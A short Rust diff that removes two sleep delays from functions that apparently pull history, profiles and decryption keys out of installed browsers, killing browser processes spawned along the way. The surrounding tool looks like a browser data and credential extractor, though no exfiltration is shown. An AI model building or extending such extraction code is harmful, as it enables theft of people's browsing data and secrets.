@@ -674,7 +674,6 @@ pub fn extract_history(profile_path: &Path) -> Option<String> {
 }
 
 pub fn extract_for_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool) -> Vec<(String, String)> {
-    std::thread::sleep(std::time::Duration::from_millis(200));
     let mut results = Vec::new();
     if !user_data_path.exists() {
         return results;
@@ -685,7 +684,6 @@ pub fn extract_for_browser(browser_name: &str, user_data_path: &Path, has_profil
         cache_browser(browser_name, user_data_path, has_profiles, k);
     }
     crate::core::kill::kill_new_browsers(&pids_before);
-    std::thread::sleep(std::time::Duration::from_millis(300));
     let keys_ref_opt = keys.as_ref();
     let profiles = get_profiles(user_data_path, has_profiles);
     for (profile_name, profile_path) in profiles {
